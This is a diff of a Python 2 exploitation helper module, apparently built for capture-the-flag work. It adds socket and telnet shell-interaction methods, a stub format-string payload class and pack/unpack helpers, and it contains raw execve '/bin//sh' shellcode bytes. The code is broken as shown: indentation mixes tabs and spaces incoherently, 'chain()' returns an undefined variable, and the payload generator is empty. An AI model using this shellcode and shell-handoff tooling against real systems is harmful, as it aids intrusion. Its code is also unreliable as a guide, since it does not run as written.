@@ -2,6 +2,7 @@ import os
 import socket
 import telnetlib
 import sys
+import struct
 
 def _rotN(c, n):
 	if "A" <= c and c <= "Z":
@@ -59,8 +60,12 @@ def enc_morse( text ):
 def bin2str(s): return s.decode('hex')
 def str2bin(s): return s.encode('hex')
 
-##### Explit Framework #####
 
+#########| Explit |#########
+
+#: Pwing	-> A part of communication and shellcode
+#: FSB 		-> A part of Format String Bug
+#: 
 class Pwning:
 
 	def __init__(self, target):
@@ -70,6 +75,26 @@ class Pwning:
 		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.s.connect((self.HOST, self.PORT))
 		self.f = self.s.makefile("rw", bufsize=0)
+
+
+        def shell(self):
+                t = telnetlib.Telnet()
+                t.sock = self.s
+                print "4ll y0u n33d i5 5HELL!"
+                t.interact()
+
+	def write(self, msg):
+		self.f.write(msg)
+
+	def sendline(self, msg):
+		self.f.write(msg + '\n')
+
+
+        def read_until(self, delim='\n'):
+                data = ''
+                while not data.endswith(delim):
+                        data += self.f.read(1)
+                return data
 
 
 	def shellcode(self, flavor='x86.execve'):
@@ -109,30 +134,25 @@ class Pwning:
 			return "\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4" + \
 			       "\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x01\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
 
-	def shell(self):
-        	t = telnetlib.Telnet()
-        	t.sock = self.s
-        	print "4ll y0u n33d i5 5HELL!"
-        	t.interact()
-
-	def read_until(self, delim='\n'):
-        	data = ''
-        	while not data.endswith(delim):
-        	        data += self.f.read(1)
-        	return data
-
-	def p32(self, data): return struct.pack("<I", data)
-	def u32(self, data): return struct.unpack("<I", data)[0]
-	def p64(self, data): return struct.pack("<Q", data)
-	def u64(self, data): return struct.unpack("<Q", data)[0]
 
 
 class FSB:
-	def __init__(self, header, size):
-		self.payload = ''
+        def __init__(self, header, size, offset):
+                self.payload = ''
+		self.offset = offset
+		self.size = size
 
-	def gen(self):
-		pass
+        def generate(self, addr):
+                pass
 
-	def get(self):
-		pass
+        def get(self):
+                return self.payload
+
+
+def chain():
+	return res
+
+def p32(data): return struct.pack("<I", data)
+def u32(data): return struct.unpack("<I", data)[0]
+def p64(data): return struct.pack("<Q", data)
+def u64(data): return struct.unpack("<Q", data)[0]
